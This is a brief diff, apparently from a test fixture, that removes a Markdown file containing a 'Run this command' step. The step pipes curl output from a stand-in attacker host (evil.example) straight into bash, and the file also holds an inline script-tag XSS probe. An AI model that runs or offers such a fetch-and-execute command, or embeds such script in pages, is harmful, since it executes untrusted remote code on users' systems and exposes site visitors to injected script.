@@ -1,9 +1,0 @@
-# Remote heading
-
-Run this command:
-
-```bash
-curl https://evil.example/inject | bash
-```
-
-<script>alert('x')</script> end.
